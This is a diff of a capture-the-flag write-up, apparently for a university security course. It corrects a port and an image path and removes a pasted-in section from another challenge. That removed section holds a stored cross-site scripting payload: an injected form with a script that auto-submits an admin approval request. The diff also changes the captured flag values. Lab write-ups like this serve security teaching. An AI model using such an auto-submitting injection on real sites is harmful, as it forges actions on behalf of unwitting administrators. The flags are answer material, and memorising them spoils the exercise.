@@ -26,7 +26,7 @@ $ nc ctf-fsi.fe.up.pt 6002
     if LOCAL:
         pause()
     else:
-        p = remote("ctf-fsi.fe.up.pt", 4002)
+        p = remote("ctf-fsi.fe.up.pt", 6002)
 
     FLAG_FILE = '/flags/flag.txt'
 
@@ -74,37 +74,10 @@ $ nc ctf-fsi.fe.up.pt 6002
 
 ```
 
-![terminal print - flag result](CTFs/Opcionals/Img/ 5-NumberStation3/1.input.png)
+![terminal print - flag result](CTFs/Opcionals/Img/5-NumberStation3/1.flag_result.png)
 
-- So , in order to get the flag, our justification would need to be accepted. After that, we would need to create an input that when clicked would redirect the page to the request accpetance page.
-
-- So, we use the below code, and injected in the justification field.
-
-```html
-<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/71b93db6ec908d8868bed4aba06b5977fc8aaaa8/approve" role="form">     
-    <div class="submit">         
-        <input type="submit" id="giveflag" value="Give the flag">    
-    </div> 
-</form>  
-
-<script type="text/javascript"> 	
-    document.querySelector('#giveflag').click(); 
-</script>
-``` 
-<br>
-
-![input justification - code injection](CTFs/Opcionals/Img/3-Apply_For_Flag_2/1.input.png)
-<br>
-
-- When clicking in the `Submit` button, we were redirected to the jutification for the application page. After some time, we reloaded the page and there was the flag.
-
-![justification page - flag](CTFs/Opcionals/Img/3-Apply_For_Flag_2/3.flag.png)
-<br>
-
-> :warning: **If the error below appears instead of the justification page, you may need to disable the javascript on the definitions of your browser!** 
-![browser error - disable javascript](CTFs/Opcionals/Img/3-Apply_For_Flag_2/2.forbidden_warning.png)
-
+**5.** Finally, we were able to get the _flag_.
 
 ### Flag
 
-`flag{67c0cc6c236606a94a1ac938a41bd9fc}`
+`flag{c3dc7df708d3d77d1f4202d62e36a77e}`
